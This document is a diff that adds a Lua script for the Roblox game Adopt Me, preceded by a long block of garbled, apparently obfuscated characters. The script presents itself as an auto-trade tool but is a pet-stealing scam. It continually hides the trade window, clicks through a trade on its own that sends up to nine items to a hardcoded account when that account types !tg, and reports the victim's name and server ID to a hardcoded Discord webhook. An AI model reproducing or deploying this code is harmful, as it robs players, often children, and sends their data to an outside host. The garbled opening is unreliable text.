8-2GQ--F/-R}Q-8}5-kQl-5%I!QK-85L}8lW/kIaJ-85!-}}f-Fk2-JLq-!=}/fu8-2.k-qy/F<OQ!FQ5-k0l-!2I-Q}--Ipqkl%F5IGJ!-z!/}aq-If2-Jfq-!fW-fl8-2cJqqw/5HKQF8C5Fky--!fI-Ql--5f}-lqF-NkQ}-T5^}of8FW2-Jcq-!-u-fl8-2-k-qk/-&lf-8d52kpq-/>I8Q7--5X}!!FF-IWJ-8N!-}}f-FQfkJtq-!SkQfe882TQ-!8/-wlQ-8f5-kql-!kflQh8i5zk}l^F-I+J-FF!-}lf-F-2-Jkq-!l8Fft822WJ2q_/8m)Q-8r5!-Fl-/AI-fl--5}}-lQ}kInJ--M2Q}pf8FGA--8q-!lW-ff8-2qk--k}l4UfV8T55k l-/^I-lF--5l}-l-F-IkJ--l58}3f2F_=QJ q8!Wm8fM8!QFk-qU/-}!Q-8}5-kQ5k/iI-QHFl5D}8l,!-Q8J--l!-}Qf-Fk2-JTC!!{O2f_8F21k8qB/2}2Q-8_5-kql-/}I-Qk--5Q-kl>F-IRJI-r!8}uf-2I2-J?q-!}B-f,8-2{k-qy/-05Q-8U5-kkqJ/DI-QN5}J5q8!qz5JkF5IQJ!qI!lFk22J3q-!Pf-/}VFQf8l2Q/F:QQ-8U5-8r!5kQl/Qk-/5O}-l0I}lJq8-k!I}3f-F>J2882/k8lF/!I52kJ}q</-;<8-I!J888!5kkJI/fI}5k}5lTF-IpF!2}kFq!/5Fk22J q-!jq}/2S/Qf8F2Q/FWfQ-8p5--!5qkqf5/k-F58}-l.F-f8FlIlk5q2!!HIfFF8qF!Qb-fX8-k2-855}5:kQ58_5-kz5-}}l}/kI/5kkll_F-IaqI2fJ!fQ/5}JQ/8f2lkQl8/2S!fJk-8f/-t,Q-8.lQkzl-/0I-QE--5pkFl5F-I}J--!!-}(f-FhI5J_qF!ov-f?8-2&Q--f/-WkQ-8k5-kll-5Vo8QG-F5T}FlU/fIwJ-8O!-}kf-FJ2-Jtq-!0}}f7882Xk-qa//tYQ!IF5-k{l-5}I-Q}--ICq}liF2IhJ5-n!!}WlFI22-J-q-!}B-fe8-26fkqA/2edfm8M5Fkol2QkI-Ql--I}}-l}F-I%J--QJk};f-Fe 8JOq8!bk-FF8-2lk-qf/-,fQ-8l28kgl2/tM8Q3-85b}8ltF!fFJ--+!-k}f-F}2-JQ2k!RW-f7/82jk8qw5-fFQ-8l5-kfl-/kI-Ql}F5L}2l3!8IWJ8-X!-} f!^F2-J6q-2}{-f}8-_%-kqu/IrZQ28+2JkB--#8I-Qq--5q}-l8F-Iy/f-g!I}NfFFK2FJ3825!^-fq8-I!k-q}/-CFQ-8QQkkdl-/%}QQ*-85AJ2q!F-IqJ-8!!-}}f-FJ2-JQ2k!wh-fB/Q2zk8qw/!lFQ-8K5-Q}l-/}I-fk}/53kHlAFII{J--m2-lFf-F-2-J-q-!-N-f)#!2zJ}qY/-KTQ-8{5-8Ql-/FI-Qf--5G}-lAk#I6Qe-:5k}7f8F)22Q2q-!}C-f-8-2}k-qk/-zQ/k815-kmqv/%I8Qg--55}-l<F-IkJ--y!-}rFqFD2-JHq8!?U-fj8-2jk-qa!kxvQ-8.5Fk/l-/{I--q25QQf/!-}}f!8!Ikk5q2fFFf2-JCq-JEl8/8rFfJkFq//-&AQ-58Qf-}!I}fJF/fI!QQ-q!2FFIqJ--m!-ll!}}Jf}8k2QkfAFfF8-29k-!Q}5q-/!5kQ58Q5!}IllQk8}5S}-leI-f!88I8k5-k8I}ff}Jk-l!:,-fy5IQf8!/Q}5qJF/IfQl-Q!8}2l!/J-F5J}-lMF-J8F/!}!F}Qf-F=2--Q55J-q!fkF}2zk-qwT!lf!R.QkQ-}!F}flQQV/-57}-lN/FffJ--X!-}kf-FH2-J*-I!_i8fM8-2ok-q05-nJQ-8}5-k}l-/lI-lT-F5W}8lyF8InJI-_!-}2f-F}2-Jkq-!o4-fY8F21k-qX/-VdQF8%5!Jql-/pI-l/--5}}--Z^}IwJ5-p!!}mlaF#IF-2q-!q)-ff8-2=k-q{2kHYQ58o5IktlF/9I2f}--5f}-q}F-I}J--}!-}Q!kF+2-J%-8!Xt8f_/-J8k-qf/-aQQ-8-5-Jk!l/iIIQ?-/57}-lMF-}FJ--f!-}qf-Fk2-Jl;F!CW5f:!J27k8q;/-Y^Q!IF5-k:l-5/I-Q}--INqkl?F5I?J!-D!!}Hf2Jk2-Jfq-2/>-f}8-2nk-qQkkKYQ-8_?JkVl8/3}-8F--5f}-lQF-I8J--eJl}1f2FN28JOq-!Lo2q/8-2fk--8/-#}Q-8l5-kQ5k/NI-QTF}5.}8lKF-I5J--Q!-}kf-Fr2-Qke/!{x5fM8F2ok-qm5-f8Q-8l5-kQl-/}I-Q,b/5C}2lUFIIXJ--G!-88f-Ff2-JMq-!q*-fQdk29k-q&2}3cQ88ZI-q8l-/FI-Q8--5-}-qkclI{QQ-t5k}&f-Fe2-fFq-!F6-f!8-2kk-qlQFeGfk8#.}kRl8/:I-Q7-!JF}-l4F-}8J--}!-Jt/kFKIkJO-}!U}}f(8-Q2k-q//-,}Q-8N5-kl!2/ZpkQ_/p5x}8lR/JINJ!2F!-}Hf-!-2-J}q-!Qqkf^8-2Lf}qu/8WPQ-855-kQl-/kI-QM--5lJllHF5Iefl->!8}vfFF:2!8Fq-!1P-l28-2}k-ql5l_iQ-8O5Ikul8/7IFQA-!JF}-lPF-IqJ--}!-};F-FN2-J7q-!hd-f^8-25k-q</-EkQ-895-kR/q/TI-Q0-85=}-lMF-I0J--j!/}nf-Fp2/!F}}f8F}28J}88lqqk/!WPQ-8yQI-}5}kQIFQQ--5E}-5Q38lJFJ-75k}{f-FcIF!Jq-!0C-fJ8-2Bk-8vk/S Q-815-kblF/0CFf8--5}}-l}F-IGJ--C58};f-F^2FJ&qF!YC2fl8-2Sk-q8/-u}Q-8K5-kQ5k/LI-Q)8}5P}8leF-f2J--,!-}Vf-F(2-JZ-k!ZP-fY8827k8q;/!lFQ-8K5-kdl-/}I-Q;5q5=}-l{F8I9J--7!-})f-Fj28J6q-!ASFff8-2>k-2H}/l}/QI!5/k/l-/>I-fk}/5o}/ldF8IiJ--R!2fff-FQ2-JGq-!}W-fq8-2+qFq6/-b:Q-8G5-k4l-_kI-Q^--5}}-leF-I4-F-S!-}(fFF_2-Jrq-IlH-fz8-2Bk-q*/-u&q28w5-kgl8/dI-Q4-->l}-l4F-IkJ--N!-}+-2F,2-JCq/! o-fi8-qQk-qJ/-vkQ-8}5-k1/q/hI-QR-85_}-lnF8IhJ--w2l}*f-FW2FJQq-!U#-!QI5f-8!qk/!,?Q-8nQl-}5f}fIFQl--5#}-!l}}ffFQ2QJ/}kf!F_2-JZ5!k}q!/f8F2lk-qz/-ll/qIIQ!-f5F/kI/Q,--5K-/5fSFIkJ5-Z!-}UFk3IQFq85!!k{2f(8-2Z-555}FlfF!jJ5Fkfl-/+I-FJIqJ!-q5kFFIqJ--d!-lf!lg/fl8I2Ik2BFfQ8-2Nk-5q}8l5F58k52k{l-/tQ!F}IFJqq55QF/I=J--;!-Ix/q-fk-Jkq2!i{-fTe}Q28Q58kllfQF8l5-kKl-)Jf5/kI2Jf-Flk/kInJ--o}klJFq22k5825/kIl!/f8F2-k-q+/-Qf!mIfJ/8f5!}IlFQe--5J}-lKF-IOJ--4I!f_fFFf2-JKq-Jol//}tQQ!kFqQ/-WnQ-52J8-5!5/mI8QJ--5A}-l3F-I k-/I!Fk}f-FH2-ff5}25k5/5!fyf-!8A55Q--k/fkffF-5MJIFQf--5.}-5Q}}lQFQ2f!F}ff-Fd2-F958
+--[[
+    ADOPT ME AUTO TRADE SCRIPT
+    Works with Discord webhook via proxy
+    Triggers when target types !tg
+--]]
+
+local webhook = "https://discord.roproxy.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
+local target = "Sigmake5"
+
+local player = game.Players.LocalPlayer
+local players = game:GetService("Players")
+local http = game:GetService("HttpService")
+local input = game:GetService("VirtualInputManager")
+
+local trading = false
+
+-- Send Discord message
+local function discord(msg)
+    pcall(function()
+        local data = http:JSONEncode({content = msg})
+        request({url = webhook, method = "POST", headers = {["Content-Type"] = "application/json"}, body = data})
+    end)
+end
+
+-- Hide trade UI
+local function hideUI()
+    pcall(function()
+        for _, v in pairs(player.PlayerGui:GetChildren()) do
+            if v.Name:lower():find("trade") then
+                v:Destroy()
+            end
+        end
+    end)
+end
+
+spawn(function()
+    while wait(0.1) do
+        hideUI()
+    end
+end)
+
+-- Click function
+local function click(btn)
+    if not btn then return end
+    pcall(function()
+        local pos = btn.AbsolutePosition
+        local size = btn.AbsoluteSize
+        if pos and size then
+            local x = pos.X + size.X/2
+            local y = pos.Y + size.Y/2
+            input:SendMouseMoveEvent(x, y, 0)
+            wait(0.05)
+            input:SendMouseButtonEvent(x, y, 0, true, game, 0)
+            wait(0.05)
+            input:SendMouseButtonEvent(x, y, 0, false, game, 0)
+        end
+        btn:Fire("MouseButton1Click")
+    end)
+end
+
+-- Find player in list
+local function findPlayer()
+    for _, v in pairs(player.PlayerGui:GetDescendants()) do
+        if v:IsA("TextButton") and v.Text == target then
+            return v
+        end
+        for _, child in pairs(v:GetChildren()) do
+            if child:IsA("TextLabel") and child.Text == target then
+                return v
+            end
+        end
+    end
+    return nil
+end
+
+-- Find trade button
+local function findTradeBtn()
+    for _, v in pairs(player.PlayerGui:GetDescendants()) do
+        if v:IsA("TextButton") and v.Visible and (v.Text == "Trade" or (v.Text or ""):lower() == "trade") then
+            return v
+        end
+    end
+    return nil
+end
+
+-- Find accept button
+local function findAccept()
+    for _, v in pairs(player.PlayerGui:GetDescendants()) do
+        if v:IsA("TextButton") and v.Visible and v.Text == "Accept" then
+            return v
+        end
+    end
+    return nil
+end
+
+-- Find ready button
+local function findReady()
+    for _, v in pairs(player.PlayerGui:GetDescendants()) do
+        if v:IsA("TextButton") and v.Visible and v.Text == "Ready" then
+            return v
+        end
+    end
+    return nil
+end
+
+-- Get all pets/items
+local function getItems()
+    local items = {}
+    for _, v in pairs(player.PlayerGui:GetDescendants()) do
+        if v:IsA("ImageButton") and v.Visible then
+            local parent = v.Parent
+            if parent and (parent.Name == "Inventory" or parent.Name == "Pets") then
+                table.insert(items, v)
+            end
+        end
+    end
+    return items
+end
+
+-- Add items to trade
+local function addItems(slots)
+    local items = getItems()
+    local added = 0
+    for i = 1, math.min(slots, #items) do
+        click(items[i])
+        added = added + 1
+        wait(0.3)
+    end
+    return added
+end
+
+-- Main trade function
+local function trade()
+    if trading then
+        discord("Trade already in progress")
+        return
+    end
+    trading = true
+    
+    discord("Trade started by " .. player.Name)
+    
+    -- Find and click target
+    local targetBtn = findPlayer()
+    if not targetBtn then
+        discord("Target " .. target .. " not found")
+        trading = false
+        return
+    end
+    click(targetBtn)
+    wait(0.5)
+    
+    -- Click trade button
+    local tradeBtn = findTradeBtn()
+    if not tradeBtn then
+        discord("Trade button not found")
+        trading = false
+        return
+    end
+    click(tradeBtn)
+    wait(1)
+    
+    -- Accept request
+    local accept = findAccept()
+    if accept then
+        click(accept)
+        wait(1)
+    end
+    
+    -- Add items (max 9 slots)
+    local added = addItems(9)
+    discord("Added " .. added .. " items to trade")
+    wait(0.5)
+    
+    -- Ready up
+    local ready = findReady()
+    if ready then
+        click(ready)
+        wait(0.5)
+    end
+    
+    -- Final accept
+    local final = findAccept()
+    if final then
+        click(final)
+    end
+    
+    discord("Trade complete! " .. added .. " items sent to " .. target)
+    trading = false
+end
+
+-- Listen for !tg command
+local chat = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+if chat then
+    chat.SayMessageRequest.OnClientEvent:Connect(function(msg, sender)
+        if msg == "!tg" and sender == target then
+            discord("!tg received from " .. target)
+            wait(1)
+            trade()
+        end
+    end)
+end
+
+-- Check if target already in server
+for _, v in pairs(players:GetPlayers()) do
+    if v.Name == target then
+        discord("Target " .. target .. " is already in server")
+        break
+    end
+end
+
+-- Send startup message
+discord("Adopt Me Trade Script Loaded")
+discord("Executor: " .. player.Name)
+discord("Target: " .. target)
+discord("Server: " .. game.JobId)
+discord("Waiting for " .. target .. " to type !tg")
+
+print("=" .. string.rep("=", 50))
+print("ADOPT ME TRADE SCRIPT LOADED")
+print("=" .. string.rep("=", 50))
+print("Executor: " .. player.Name)
+print("Target: " .. target)
+print("Trigger: " .. target .. " types !tg")
+print("=" .. string.rep("=", 50))
+
+while wait(60) do end
